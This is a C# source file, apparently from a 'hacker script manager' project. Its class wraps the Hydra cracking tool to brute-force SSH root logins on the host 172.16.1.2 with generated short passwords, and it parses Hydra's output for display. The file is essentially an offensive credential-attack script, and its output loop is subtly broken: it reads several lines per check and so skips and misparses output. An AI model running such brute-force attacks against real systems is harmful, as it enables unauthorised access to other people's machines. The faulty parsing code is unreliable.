using System;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace hacker_script_manager
{
    class HydraScript : Script
    {
        readonly Process p = new Process();

        

        private void ShowMatch(string text, string expr)
        {
            MatchCollection mc = Regex.Matches(text, expr);
            foreach (Match m in mc)
            {
                Console.WriteLine(m);

                if (m.ToString().Contains("[child 0]"))
                {
                    Outputs.Add(m.ToString().Replace("[child 0] (0/0)", "."));
                }
                else if (m.ToString().Contains("[child 1]"))
                {
                    Outputs.Add(m.ToString().Replace("[child 1] (0/0)", "."));
                   
                }
                else if (m.ToString().Contains("[child 2"))
                {
                    Outputs.Add(m.ToString().Replace("[child 2] (0/0)", "."));
                }
                else if (m.ToString().Contains("[child 3"))
                {
                    Outputs.Add(m.ToString().Replace("[child 3] (0/0)", "."));
                }
                else if (m.ToString().Contains("[child 4"))
                {
                    Outputs.Add(m.ToString().Replace("[child 4] (0/0)", "."));
                }
                else
                {
                    Outputs.Add(m.ToString() + "#");
                }
            }
        }

        public override void StartScript()
        {
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = @"/usr/bin/hydra";
          
            p.StartInfo.Arguments = "-l root -x 3:5:a 172.16.1.2 -t 4 ssh -v -V -I";
            p.Start();

            try
            {
                while (!p.StandardOutput.EndOfStream)
                {
                    if (p.StandardOutput.ReadLine().Contains("[ATTEMPT]"))
                    {

                        ShowMatch(p.StandardOutput.ReadLine(), @"([^\-]+$)");
                    }
                    else if (p.StandardOutput.ReadLine().Contains("[ERROR]"))
                    {
                        var pattern = @"\[(\w*)\]";
                        var replaced = Regex.Replace(p.StandardOutput.ReadLine(), pattern, "?");
                        ShowMatch(replaced, @"(?<=\?).*");
                    }
                }
            }
            catch
            {
                Console.WriteLine("Hydra has been stopped..");
            }
        }

        public override void StopScript()
        {
            p.Close();
           //or p.Kill();
        }
    }
}